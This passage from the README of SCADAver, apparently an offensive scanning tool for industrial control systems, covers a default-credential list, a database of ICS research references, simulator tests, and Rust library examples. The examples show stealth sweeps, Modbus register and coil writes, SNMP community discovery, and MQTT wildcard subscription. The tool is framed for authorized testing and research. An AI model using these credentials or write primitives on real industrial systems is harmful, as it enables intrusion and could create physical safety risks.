passwords = ["", "SIMATIC", "step7"]

[http]
credentials = [
    ["admin", "admin"],
    ["Administrator", "1234"],
]
```

CLI flags take precedence over configuration values. The MQTT section is present in the sample configuration, but MQTT port, TLS, and protocol selection are controlled through the MQTT interfaces rather than applied as global startup defaults.

## Embedded Research References

The binary embeds roughly 300 publicly disclosed ICS security writeups sourced from [awesome-ics-writeups](https://github.com/neutrinoguy/awesome-ics-writeups), including research from Claroty, ZDI, Nozomi Networks, Microsoft, Dragos, and others.

```sh
scadaver db refs
scadaver db refs siemens
scadaver db refs schneider
scadaver db refs modbus
scadaver db refs malware       # ICS malware writeups (TRITON, Industroyer, etc.)
scadaver db refs ics-general   # OT-specific general research
```

Valid vendor slugs: `beckhoff`, `siemens`, `schneider`, `rockwell`, `mitsubishi`, `omron`, `phoenix`, `ewon`, `modbus`, `iec104`, `enip`, `snmp`, `malware`, `ics-general`, `general`.

Use `B` in the TUI to view references associated with the selected device. Refresh the embedded source data during development with:

```sh
python scripts/fetch_refs.py
```

## Database

Successful targeted scans and `--live` reads save a protocol-specific endpoint,
tags, and observed values. Normal `get` commands are cache-first and show the
record age; add `--live` to refresh a target. This lets one host retain, for
example, independent Modbus and EtherNet/IP ports without one discovery
overwriting the other. Writes require a matching inventory record no older than
48 hours unless `--confirm-stale` is supplied.

```sh
# Live discovery and compact cached follow-up reads
scadaver -i 10.0.0.50 -p 44818 --protocol rockwell scan
scadaver --live -i 10.0.0.50 --protocol rockwell get tags --values
scadaver -i 10.0.0.50 --protocol rockwell get tags

# Inspect saved protocol endpoints and cached values for one host
scadaver db show --ip 10.0.0.50

# Add a device manually
scadaver db add --ip 10.0.0.50 --vendor siemens

# Remove a device by database ID
scadaver db remove --id 3

# Import hosts from nmap XML output (-oX)
scadaver import --nmap lab-scan.xml

# Export the device database
scadaver export --format json
scadaver export --format csv --output devices.csv
```

## Testing

Run the Rust unit, API, and loopback integration tests with:

```sh
cargo test --all-features
```

The simulator suite provides protocol stubs on unprivileged ports by default:

```sh
python sim/run_all.py --profile high
python sim/smoke.py --profile high
python sim/write_smoke.py --profile high
```

For an isolated eWON Flexy published-Modbus read/write/read-back/restore test
that does not require the rest of the suite, build SCADaver and run:

```sh
python sim/ewon_smoke.py --scadaver target/release/scadaver
```

On Windows, use `target\release\scadaver.exe`. The eWON smoke starts its own
loopback HTTP and Modbus listeners on high ports and stops them on completion.

Start selected simulators with `--only`, for example:

```sh
python sim/run_all.py --profile high --only modbus siemens mqtt
```

Use `--profile canonical` for standard protocol ports. Administrator or root privileges may be required for ports below 1024. Additional CI simulators and in-process loopbacks cover BACnet, DNP3, OPC UA, SNMP, Modbus, and the remaining protocol clients.

Useful external lab targets include:

- [PyScada](https://pyscada.readthedocs.io/en/main/), a Django-based SCADA stack with Modbus, OPC UA, historian, and HMI components
- [Pump Station Simulator](https://github.com/dscioli/pump-station-simulator), a Modbus TCP pump-station ladder-logic simulator

## Library Usage

Disable default features to compile only the synchronous protocol library:

```toml
[dependencies]
scadaver = { version = "1", default-features = false }
```

Enable the derive macro when converting vendor structs into the unified `DeviceInfo` type:

```toml
[dependencies]
scadaver = { version = "1", default-features = false, features = ["macros"] }
scadaver-macros = "1"
```

### Multi-protocol sweep

```rust
use scadaver::prelude::*;

set_stealth(true);

for outcome in sweep("192.168.1.100", 8) {
    if let Some(device) = outcome.device {
        println!("[{}] {}: {:?}", device.vendor, device.ip, device.fields);
    }
}
```

### Rockwell tags

```rust
use scadaver::vendors::rockwell::driver;

let device = driver::get_device_info("192.168.1.50", 44818)?;
println!("{}: {}", device.product_name, device.revision);

let tags = driver::enumerate_tags("192.168.1.50", 44818)?;
for tag in &tags {
    let value = driver::read_tag("192.168.1.50", 44818, &tag.name)?;
    println!("{} = {}", tag.name, driver::decode_value(tag.tag_type, &value, &Default::default()));
}
```

### Modbus TCP

```rust
use scadaver::core::modbus;

let regs = modbus::read_holding_registers("192.168.1.30", 502, 0, 10)?;
for r in regs {
    println!("{}: {} (raw {})", r.display_address, r.value_str, r.raw);
}

modbus::write_single_register("192.168.1.30", 502, 100, 1234)?;
modbus::write_single_coil("192.168.1.30", 502, 5, true)?;
```

### SNMP

```rust
use scadaver::vendors::snmp::{client, oids};

let community = client::discover_community("192.168.1.110", 161);
if let Some(c) = community {
    let descr = client::get("192.168.1.110", 161, &c, oids::SYS_DESCR)?;
    println!("{}", descr.display());
    for (oid, val) in client::walk("192.168.1.110", 161, &c, "1.3.6.1.2.1.2")? {
        println!("{} = {}", oid, val.display());
    }
}
```

### MQTT session

```rust
use scadaver::vendors::mqtt::session::{ConnectOptions, MqttSession};
use std::time::Duration;

let opts = ConnectOptions {
    host: "10.0.0.60".into(),
    port: 1883,
    client_id: "my-scanner".into(),
    ..ConnectOptions::default()
};
let mut session = MqttSession::connect(&opts)?;
session.subscribe("factory/#", 0)?;
std::thread::sleep(Duration::from_secs(2));
for msg in session.drain_messages() {
    println!("[{}] {}", msg.topic, msg.payload_str());
}
session.disconnect()?;
```

### Public namespaces

| Namespace | Coverage |
| --- | --- |
| `scadaver::vendors::bacnet` | BACnet/IP discovery and property reads |
| `scadaver::vendors::beckhoff` | ADS/AMS, TwinCAT, and CX web control |
| `scadaver::vendors::dnp3` | DNP3 detection, attributes, and integrity reads |
| `scadaver::vendors::enip` | EtherNet/IP discovery and enumerations |
| `scadaver::vendors::ewon` | eWON IPCONF scanning and HTTP validation |
| `scadaver::vendors::iec104` | IEC 60870-5-104 client sessions |
| `scadaver::vendors::mitsubishi` | SLMP / MC Protocol 3E |
| `scadaver::vendors::mqtt` | MQTT probing, sessions, attacks, and Sparkplug tooling |
| `scadaver::vendors::omron` | FINS TCP and UDP |
| `scadaver::vendors::opcua` | OPC UA Binary endpoint discovery |
| `scadaver::vendors::phoenix` | ProConOS and WebVisit |
| `scadaver::vendors::rockwell` | EtherNet/IP and CIP tag operations |
| `scadaver::vendors::schneider` | Modbus TCP, FC90, and Schneider discovery |
| `scadaver::vendors::siemens` | S7Comm / ISO-on-TCP |
| `scadaver::vendors::snmp` | SNMP client, enumeration, and OID constants |
| `scadaver::core::autodetect` | Unified sweep engine and stealth mode |
| `scadaver::core::modbus` | Raw Modbus TCP client primitives |
| `scadaver::core::network` | Interface enumeration and broadcast sockets |
| `scadaver::references` | Embedded ICS research database |
| `scadaver::prelude` | Common device types, sweep functions, and result types |

The optional `scadaver-macros` crate provides `#[derive(IntoDeviceInfo)]` with `ip`, `skip`, `rename`, and `optional` field attributes. See `tests/macros_derive.rs` for complete examples.

## Responsible Use and License

SCADAver is intended for authorized penetration tests, red team exercises, OT security research, controlled training labs, and CTF competitions. Unauthorized use against systems you do not own or have explicit permission to test may be illegal and may create physical safety risks.

The authors assume no liability for misuse. See the [PolyForm Noncommercial License 1.0.0](LICENSE) for the project's licensing terms.

## Author

- [Saif "Sawyer" Yaseen](https://github.com/SawyersPresent)

## Credits

- **[mqttui](https://github.com/EdJoPaTo/mqttui)**: topic-browser and live-message display patterns informed the TUI monitor view and topic table in `src/tui.rs`.
- **Sparkplug Fuzzer by timzaak**: the Sparkplug B fuzzing approach, category structure, and payload patterns informed `src/vendors/mqtt/sparkplug_fuzz.rs`. The original public repository link is no longer available.
- **[python-mqtt-client-shell](https://github.com/bapowell/python-mqtt-client-shell)** by Barry Powell: its interactive shell and command-loop design informed `src/mqtt_shell.rs`.
- **[HackTricks MQTT Pentesting Guide](https://hacktricks.wiki/en/network-services-pentesting/1883-pentesting-mqtt-mosquitto.html)**: ACL wildcard, stored-session, and retained-message assessment techniques informed `src/vendors/mqtt/attacks.rs` and the MQTT interfaces.
